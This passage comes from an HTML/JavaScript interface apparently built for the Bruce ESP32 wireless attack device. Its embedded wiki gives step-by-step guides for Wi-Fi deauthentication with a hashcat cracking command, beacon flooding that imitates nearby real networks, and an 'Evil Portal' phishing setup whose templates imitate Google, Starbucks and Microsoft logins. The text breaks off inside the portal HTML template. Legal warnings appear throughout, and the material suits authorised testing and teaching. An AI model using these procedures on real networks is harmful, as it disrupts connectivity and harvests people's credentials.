                    <div class="toggle active" id="toggleSound" onclick="UI.toggleSetting('sound')"></div>
                </div>
                <div class="settings-row">
                    <div><div class="settings-name">Animations</div><div class="settings-desc">Enable UI animations</div></div>
                    <div class="toggle active" id="toggleAnim" onclick="UI.toggleSetting('animations')"></div>
                </div>
            </div>
            <div class="settings-group">
                <div class="settings-label">Simulation</div>
                <div class="settings-row">
                    <div><div class="settings-name">Simulation Speed</div><div class="settings-desc">Adjust animation speed</div></div>
                    <input type="range" class="range-slider" id="simSpeed" min="0.5" max="2" step="0.1" value="1" onchange="UI.setSimSpeed(this.value)">
                </div>
                <div class="settings-row">
                    <div><div class="settings-name">Auto-scroll Logs</div><div class="settings-desc">Scroll to new log entries</div></div>
                    <div class="toggle active" id="toggleAutoScroll" onclick="UI.toggleSetting('autoScroll')"></div>
                </div>
            </div>
            <div class="settings-group">
                <div class="settings-label">Data</div>
                <div class="settings-row">
                    <div><div class="settings-name">Export Session</div><div class="settings-desc">Download simulation data</div></div>
                    <button class="sim-btn" onclick="UI.exportSession()">Export</button>
                </div>
                <div class="settings-row">
                    <div><div class="settings-name">Clear All Data</div><div class="settings-desc">Reset all simulations</div></div>
                    <button class="sim-btn danger" onclick="UI.clearAllData()">Clear</button>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Keyboard Shortcuts Modal -->
<div class="modal-overlay" id="shortcutsModal">
    <div class="modal">
        <div class="modal-header">
            <span class="modal-title">‚å®Ô∏è Keyboard Shortcuts</span>
            <button class="modal-close" onclick="UI.closeModal('shortcutsModal')">&times;</button>
        </div>
        <div class="modal-body">
            <div class="shortcut-grid">
                <div class="shortcut-item"><span class="shortcut-action">Dashboard</span><div class="shortcut-keys"><span class="shortcut-key">D</span></div></div>
                <div class="shortcut-item"><span class="shortcut-action">Wi-Fi Module</span><div class="shortcut-keys"><span class="shortcut-key">W</span></div></div>
                <div class="shortcut-item"><span class="shortcut-action">Bluetooth</span><div class="shortcut-keys"><span class="shortcut-key">B</span></div></div>
                <div class="shortcut-item"><span class="shortcut-action">Infrared</span><div class="shortcut-keys"><span class="shortcut-key">I</span></div></div>
                <div class="shortcut-item"><span class="shortcut-action">RF Module</span><div class="shortcut-keys"><span class="shortcut-key">R</span></div></div>
                <div class="shortcut-item"><span class="shortcut-action">GPS</span><div class="shortcut-keys"><span class="shortcut-key">G</span></div></div>
                <div class="shortcut-item"><span class="shortcut-action">Tools</span><div class="shortcut-keys"><span class="shortcut-key">T</span></div></div>
                <div class="shortcut-item"><span class="shortcut-action">Help</span><div class="shortcut-keys"><span class="shortcut-key">H</span></div></div>
                <div class="shortcut-item"><span class="shortcut-action">Search</span><div class="shortcut-keys"><span class="shortcut-key">/</span></div></div>
                <div class="shortcut-item"><span class="shortcut-action">Settings</span><div class="shortcut-keys"><span class="shortcut-key">Ctrl</span><span class="shortcut-key">,</span></div></div>
                <div class="shortcut-item"><span class="shortcut-action">Close Modal</span><div class="shortcut-keys"><span class="shortcut-key">Esc</span></div></div>
                <div class="shortcut-item"><span class="shortcut-action">Shortcuts</span><div class="shortcut-keys"><span class="shortcut-key">?</span></div></div>
            </div>
        </div>
    </div>
</div>

<!-- Payload Library Modal -->
<div class="modal-overlay" id="payloadModal">
    <div class="modal">
        <div class="modal-header">
            <span class="modal-title">üì¶ Payload Library</span>
            <button class="modal-close" onclick="UI.closeModal('payloadModal')">&times;</button>
        </div>
        <div class="modal-body">
            <div class="payload-grid" id="payloadGrid"></div>
        </div>
        <div class="modal-footer">
            <button class="sim-btn" onclick="UI.closeModal('payloadModal')">Cancel</button>
            <button class="sim-btn primary" onclick="UI.loadSelectedPayload()">Load Payload</button>
        </div>
    </div>
</div>

<!-- Credentials Modal -->
<div class="modal-overlay" id="credsModal">
    <div class="modal">
        <div class="modal-header">
            <span class="modal-title">üîê Captured Credentials</span>
            <button class="modal-close" onclick="UI.closeModal('credsModal')">&times;</button>
        </div>
        <div class="modal-body" id="credsContent"></div>
        <div class="modal-footer">
            <button class="sim-btn" onclick="UI.exportCreds()">Export CSV</button>
            <button class="sim-btn danger" onclick="UI.clearCreds()">Clear All</button>
        </div>
    </div>
</div>

<!-- Floating Action Button -->
<button class="fab" id="fabBtn" onclick="UI.openModal('settingsModal')">‚öôÔ∏è</button>

<div class="app-container">
    <!-- 1. LEFT SIDEBAR -->
    <nav class="sidebar">
        <div class="brand">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"></path></svg>
            BRUCE_OS
        </div>

        <div class="nav-section-title" id="nav-modules">Modules</div>
        <button class="nav-btn active" data-tab="dashboard" aria-label="Dashboard" aria-current="page">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
            <span class="nav-text">Dashboard</span>
        </button>
        <button class="nav-btn" data-tab="wifi" aria-label="Wi-Fi Module">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M5 12.55a11 11 0 0 1 14.08 0"></path><path d="M1.42 9a16 16 0 0 1 21.16 0"></path><path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path></svg>
            <span class="nav-text">Wi-Fi</span>
        </button>
        <button class="nav-btn" data-tab="ble" aria-label="Bluetooth Module">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="m7 7 10 10-5 5V2l5 5L7 17"></path></svg>
            <span class="nav-text">Bluetooth</span>
        </button>
        <button class="nav-btn" data-tab="ir" aria-label="Infrared Module">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M2 12h20"></path><path d="M7 12v-2"></path><path d="M7 16v-2"></path></svg>
            <span class="nav-text">Infrared</span>
        </button>
        <button class="nav-btn" data-tab="rf" aria-label="RF SubGHz Module">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M4.93 19.07a10 10 0 0 1 14.14 0"></path><path d="M2 12h2"></path><path d="M20 12h2"></path></svg>
            <span class="nav-text">RF / SubGHz</span>
        </button>
        <button class="nav-btn" data-tab="gps" aria-label="GPS Module">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
            <span class="nav-text">GPS</span>
        </button>

        <div class="nav-section-title" id="nav-system">System & Help</div>
        <button class="nav-btn" data-tab="tools" aria-label="Tools">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>
            <span class="nav-text">Tools</span>
        </button>
        <button class="nav-btn" data-tab="help" aria-label="Help and Learning">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
            <span class="nav-text">Help / Learn</span>
        </button>
    </nav>

    <!-- 2. MAIN STAGE -->
    <main class="main-stage">
        <div class="top-bar">
            <div class="search-container">
                <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                <input type="search" class="search-input" id="searchBox" placeholder="Search attacks, modules, tools..." aria-label="Search attacks, modules, and tools" autocomplete="off">
            </div>
            <span id="offline-status" class="offline-badge" role="status" aria-live="polite">üì° Offline Ready</span>
            <button class="mobile-toggle" id="mobileWikiToggle" aria-label="Toggle wiki panel" aria-expanded="false">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
            </button>
        </div>

        <div class="content-scroll" id="view-port">
            <!-- Content Injected Here -->
        </div>
    </main>

    <!-- 3. DEEP WIKI SIDEBAR -->
    <aside class="wiki-sidebar" id="wikiSidebar" role="complementary" aria-label="Wiki documentation panel">
        <div class="wiki-header">
            <span class="wiki-title" id="wiki-title">Intel / Wiki</span>
            <button id="wikiCloseBtn" aria-label="Close wiki panel" style="background:none; border:none; color:var(--text-muted); cursor:pointer; font-size:1.5rem; padding:4px 8px;">&times;</button>
        </div>
        <div class="wiki-content" id="wikiContent" role="article" aria-labelledby="wiki-title">
            <!-- Wiki Injected Here -->
        </div>
    </aside>
</div>

<script>
    // --- DATABASE ---
    const DB = {
        wifi: [
            {
                id: 'deauth', title: "Deauth Attack", type: "attack", tag: "Aggressive",
                desc: "Disconnects devices from AP to capture WPA2 handshakes for offline cracking.",
                steps: ["Wi-Fi > Scan Networks", "Select Target AP", "Attacks > Deauth", "Choose Mode", "Capture Handshake"],
                wiki: `
                    <article class="wiki-article">
                        <h2>Deauthentication Attack</h2>
                        
                        <div class="legal-notice">
                            <div class="legal-title">‚ö†Ô∏è LEGAL WARNING</div>
                            <div class="legal-text">Unauthorized deauthentication attacks violate the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and similar laws worldwide. Only perform on networks you own or have explicit written authorization to test. Penalties include fines up to 250,000 USD and imprisonment.</div>
                        </div>

                        <h3>Technical Overview</h3>
                        <p>Deauthentication exploits a fundamental weakness in the IEEE 802.11 standard: management frames are not authenticated in WPA2. The attacker spoofs the AP's MAC address and sends Type 0 Subtype 12 (0xC0) frames to the client.</p>

                        <div class="diagram-box">
                            <pre>
<span class="diagram-label">ATTACK FLOW</span>

  <span class="diagram-data">[Attacker/Bruce]</span>          <span class="diagram-data">[Target Client]</span>          <span class="diagram-data">[Access Point]</span>
         ‚îÇ                           ‚îÇ                           ‚îÇ
         ‚îÇ  <span class="diagram-arrow">‚îÄ‚îÄ‚îÄDeauth Frame‚îÄ‚îÄ‚îÄ></span>     ‚îÇ                           ‚îÇ
         ‚îÇ   (Spoofed as AP)         ‚îÇ                           ‚îÇ
         ‚îÇ                           ‚îÇ                           ‚îÇ
         ‚îÇ                           ‚îÇ  <span class="diagram-arrow">‚îÄ‚îÄDisassociate‚îÄ‚îÄ></span>       ‚îÇ
         ‚îÇ                           ‚îÇ                           ‚îÇ
         ‚îÇ                           ‚îÇ  <span class="diagram-arrow"><‚îÄ‚îÄProbe Request‚îÄ‚îÄ</span>       ‚îÇ
         ‚îÇ                           ‚îÇ                           ‚îÇ
         ‚îÇ  <span class="diagram-data">[CAPTURE]</span>               ‚îÇ  <span class="diagram-arrow"><‚îÄ‚îÄ4-Way Handshake‚îÄ‚îÄ></span>    ‚îÇ
         ‚îÇ  EAPOL Frames 1-4         ‚îÇ                           ‚îÇ
         ‚îÇ                           ‚îÇ                           ‚îÇ
                            </pre>
                        </div>

                        <h3>Step-by-Step Execution</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">1</div>
                                <div class="step-content">
                                    <div class="step-title">Scan for Networks</div>
                                    <div class="step-desc">Navigate to <strong>Wi-Fi ‚Üí Scan</strong>. Wait 5-10 seconds for the scan to complete. Networks are sorted by signal strength (RSSI). Look for your target AP - stronger signal = better results.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">2</div>
                                <div class="step-content">
                                    <div class="step-title">Select Target Access Point</div>
                                    <div class="step-desc">Press ENTER on the target network. Note the channel number (1-14) and encryption type. WPA2-PSK is vulnerable; WPA3 and 802.11w (MFP) protected networks will resist this attack.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">3</div>
                                <div class="step-content">
                                    <div class="step-title">Choose Attack Mode</div>
                                    <div class="step-desc"><strong>Station Mode:</strong> Target specific client (more stealthy). <strong>Broadcast Mode:</strong> Deauth all clients (faster handshake capture but more detectable). Start with Broadcast for testing.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">4</div>
                                <div class="step-content">
                                    <div class="step-title">Execute & Monitor</div>
                                    <div class="step-desc">Press START. Watch the packet counter. When a client reconnects, Bruce automatically captures the EAPOL handshake. The screen shows "Handshake Captured!" when successful.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">5</div>
                                <div class="step-content">
                                    <div class="step-title">Export & Crack</div>
                                    <div class="step-desc">Handshake saved to <code>/SD/handshakes/[SSID].pcap</code>. Transfer via WebUI or SD card. Crack with: <code>hashcat -m 22000 capture.hc22000 wordlist.txt</code></div>
                                </div>
                            </div>
                        </div>

                        <h3>Frame Structure</h3>
                        <div class="spec-grid">
                            <div class="spec-item">
                                <div class="spec-label">Frame Type</div>
                                <div class="spec-value">0x00 (Mgmt)</div>
                            </div>
                            <div class="spec-item">
                                <div class="spec-label">Subtype</div>
                                <div class="spec-value">0x0C (Deauth)</div>
                            </div>
                            <div class="spec-item">
                                <div class="spec-label">Reason Code</div>
                                <div class="spec-value">0x07 (Class 3)</div>
                            </div>
                            <div class="spec-item">
                                <div class="spec-label">Duration</div>
                                <div class="spec-value">0x013A</div>
                            </div>
                        </div>

                        <h3>Real-World Applications</h3>
                        <ul>
                            <li><strong>Penetration Testing:</strong> Assess client resilience to forced disconnection</li>
                            <li><strong>Red Team Ops:</strong> Force reconnection to capture credentials</li>
                            <li><strong>Security Auditing:</strong> Test if 802.11w (MFP) is properly configured</li>
                            <li><strong>IoT Assessment:</strong> Test how IoT devices handle disconnection</li>
                        </ul>

                        <h3>Troubleshooting</h3>
                        <div class="info-box">
                            <strong>No handshake captured?</strong> Ensure a client is actively connected. Try Broadcast mode. Some devices cache credentials and don't perform full handshake on reconnect - wait longer or target a different client.
                        </div>
                        <div class="warning-box">
                            <strong>Attack has no effect?</strong> The AP likely has 802.11w (Management Frame Protection) enabled. This is common on enterprise networks and newer routers. MFP cryptographically signs management frames, making spoofing impossible.
                        </div>
                    </article>`
            },
            {
                id: 'beacon', title: "Beacon Spam", type: "attack", tag: "Confusion",
                desc: "Floods the 2.4GHz spectrum with thousands of fake SSIDs to confuse and overwhelm.",
                steps: ["Wi-Fi > Beacon Spam", "Select Source Type", "Configure Options", "Start Broadcast"],
                wiki: `
                    <article class="wiki-article">
                        <h2>Beacon Frame Flooding</h2>
                        
                        <p>Access Points announce their presence by broadcasting Beacon Frames approximately every 102.4ms (configurable via beacon interval). Bruce exploits this by generating thousands of spoofed beacons with unique SSIDs.</p>

                        <h3>Attack Mechanism</h3>
                        <div class="diagram-box">
                            <pre>
<span class="diagram-label">BEACON FRAME STRUCTURE (802.11)</span>

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ <span class="diagram-data">Frame Control</span> ‚îÇ <span class="diagram-data">Duration</span> ‚îÇ <span class="diagram-data">DA (Broadcast)</span> ‚îÇ <span class="diagram-data">SA (Spoofed)</span> ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ <span class="diagram-data">BSSID</span> ‚îÇ <span class="diagram-data">Seq Ctrl</span> ‚îÇ <span class="diagram-data">Timestamp</span> ‚îÇ <span class="diagram-data">Beacon Interval</span> ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ <span class="diagram-data">Capability Info</span> ‚îÇ <span class="diagram-arrow">SSID Element (Variable)</span> ‚îÇ <span class="diagram-data">Rates</span> ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

<span class="diagram-label">BROADCAST PATTERN</span>

  Bruce ‚îÄ‚îÄ<span class="diagram-arrow">‚ñ∫</span> "Free_WiFi_1"     ‚îÄ‚îÄ<span class="diagram-arrow">‚ñ∫</span> All Devices
        ‚îÄ‚îÄ<span class="diagram-arrow">‚ñ∫</span> "Starbucks_Guest" ‚îÄ‚îÄ<span class="diagram-arrow">‚ñ∫</span> in Range
        ‚îÄ‚îÄ<span class="diagram-arrow">‚ñ∫</span> "xX_H4CK3D_Xx"    ‚îÄ‚îÄ<span class="diagram-arrow">‚ñ∫</span> See Fake
        ‚îÄ‚îÄ<span class="diagram-arrow">‚ñ∫</span> "FBI_Van_7"       ‚îÄ‚îÄ<span class="diagram-arrow">‚ñ∫</span> Networks
        ‚îÄ‚îÄ<span class="diagram-arrow">‚ñ∫</span> ... (1000s more)
                            </pre>
                        </div>

                        <h3>Step-by-Step Execution</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">1</div>
                                <div class="step-content">
                                    <div class="step-title">Navigate to Beacon Spam</div>
                                    <div class="step-desc">Go to <strong>Wi-Fi ‚Üí Beacon Spam</strong>. You'll see source options for SSID generation.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">2</div>
                                <div class="step-content">
                                    <div class="step-title">Select SSID Source</div>
                                    <div class="step-desc"><strong>Random:</strong> Generates gibberish names. <strong>Funny:</strong> Pre-loaded humorous names. <strong>Custom List:</strong> Load from <code>/SD/ssids.txt</code> (one per line). <strong>Clone:</strong> Duplicate nearby real networks.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">3</div>
                                <div class="step-content">
                                    <div class="step-title">Configure Encryption Display</div>
                                    <div class="step-desc">Choose how fake networks appear: <strong>Open</strong> (no lock icon), <strong>WPA2</strong> (shows as secured), or <strong>Mixed</strong> (random). WPA2 appearance is more convincing.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">4</div>
                                <div class="step-content">
                                    <div class="step-title">Start & Monitor</div>
                                    <div class="step-desc">Press START. The counter shows beacons/second. Typical rate: 500-1000 beacons/sec. Victim devices will show dozens of new networks within seconds.</div>
                                </div>
                            </div>
                        </div>

                        <h3>Performance Metrics</h3>
                        <div class="metric-row">
                            <div class="metric-card">
                                <div class="metric-value">~1000</div>
                                <div class="metric-label">Beacons/Second</div>
                            </div>
                            <div class="metric-card">
                                <div class="metric-value">32</div>
                                <div class="metric-label">Max SSID Length</div>
                            </div>
                            <div class="metric-card">
                                <div class="metric-value">~50m</div>
                                <div class="metric-label">Effective Range</div>
                            </div>
                        </div>

                        <h3>Real-World Applications</h3>
                        <ul>
                            <li><strong>Security Awareness:</strong> Demonstrate Wi-Fi list pollution to executives</li>
                            <li><strong>Red Team Distraction:</strong> Bury legitimate AP in noise during engagement</li>
                            <li><strong>Honeypot Detection:</strong> Test if security tools alert on mass SSID appearance</li>
                            <li><strong>Social Engineering:</strong> Create convincing fake corporate networks</li>
                        </ul>

                        <h3>Custom SSID List Format</h3>
                        <div class="code-block"># /SD/ssids.txt
CompanyName_Guest
CompanyName_Secure
IT_Department_Only
Printer_Network
Conference_Room_A</div>

                        <div class="info-box">
                            <strong>Pro Tip:</strong> For maximum impact, scan nearby networks first and create SSIDs that look like variations of legitimate ones (e.g., "Starbucks_Free" near a real "Starbucks" network).
                        </div>
                    </article>`
            },
            {
                id: 'portal', title: "Evil Portal", type: "attack", tag: "Phishing",
                desc: "Creates rogue AP with captive portal to harvest credentials via social engineering.",
                steps: ["Prepare Portal Files", "Configure AP Settings", "Select Template", "Monitor Captures", "Export Credentials"],
                wiki: `
                    <article class="wiki-article">
                        <h2>Evil Twin / Captive Portal Attack</h2>
                        
                        <div class="legal-notice">
                            <div class="legal-title">‚ö†Ô∏è CREDENTIAL HARVESTING WARNING</div>
                            <div class="legal-text">Creating fake login pages to capture credentials is illegal without explicit authorization. This technique is used in authorized penetration tests and security awareness training only. Captured data must be handled according to data protection regulations (GDPR, CCPA, etc.).</div>
                        </div>

                        <h3>Attack Architecture</h3>
                        <div class="diagram-box">
                            <pre>
<span class="diagram-label">EVIL PORTAL NETWORK TOPOLOGY</span>

                    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
                    ‚îÇ   <span class="diagram-data">VICTIM DEVICE</span>   ‚îÇ
                    ‚îÇ  (Phone/Laptop)  ‚îÇ
                    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                             ‚îÇ
                    <span class="diagram-arrow">Connects to "Free_WiFi"</span>
                             ‚îÇ
                             ‚ñº
                    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
                    ‚îÇ   <span class="diagram-data">BRUCE (ESP32)</span>   ‚îÇ
                    ‚îÇ                  ‚îÇ
                    ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
                    ‚îÇ  ‚îÇ <span class="diagram-label">DNS Server</span> ‚îÇ  ‚îÇ  ‚Üê All DNS queries ‚Üí 192.168.4.1
                    ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
                    ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
                    ‚îÇ  ‚îÇ <span class="diagram-label">Web Server</span> ‚îÇ  ‚îÇ  ‚Üê Serves fake login page
                    ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
                    ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
                    ‚îÇ  ‚îÇ <span class="diagram-label">Credential </span>‚îÇ  ‚îÇ  ‚Üê Logs POST data
                    ‚îÇ  ‚îÇ <span class="diagram-label">Logger     </span>‚îÇ  ‚îÇ
                    ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
                    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                            </pre>
                        </div>

                        <h3>Step-by-Step Setup</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">1</div>
                                <div class="step-content">
                                    <div class="step-title">Prepare SD Card Structure</div>
                                    <div class="step-desc">Create the portal directory structure on your microSD card. Each portal is a folder containing HTML/CSS/JS files.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">2</div>
                                <div class="step-content">
                                    <div class="step-title">Configure Access Point</div>
                                    <div class="step-desc">Set SSID to match target environment. Examples: "Starbucks_Free", "Hotel_Guest", "Company_Visitor". Use Open authentication (no password) for maximum victim connection rate.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">3</div>
                                <div class="step-content">
                                    <div class="step-title">Select Portal Template</div>
                                    <div class="step-desc">Choose from built-in templates or your custom portal. The portal auto-loads when victims open any webpage due to DNS hijacking.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">4</div>
                                <div class="step-content">
                                    <div class="step-title">Monitor & Capture</div>
                                    <div class="step-desc">Watch the screen for "Credential Captured!" notifications. All form submissions are logged to <code>/SD/creds.txt</code> with timestamps.</div>
                                </div>
                            </div>
                        </div>

                        <h3>SD Card File Structure</h3>
                        <div class="code-block">/SD/
‚îú‚îÄ‚îÄ portals/
‚îÇ   ‚îú‚îÄ‚îÄ google/
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ index.html      ‚Üê Main login page
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ style.css       ‚Üê Styling
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ logo.png        ‚Üê Google logo
‚îÇ   ‚îú‚îÄ‚îÄ starbucks/
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ index.html
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ terms.html      ‚Üê Fake terms page
‚îÇ   ‚îú‚îÄ‚îÄ microsoft/
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ index.html
‚îÇ   ‚îî‚îÄ‚îÄ custom/
‚îÇ       ‚îî‚îÄ‚îÄ index.html      ‚Üê Your custom portal
‚îî‚îÄ‚îÄ creds.txt               ‚Üê Captured credentials</div>

                        <h3>Portal HTML Template</h3>
                        <div class="code-block">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Sign In&lt;/title&gt;
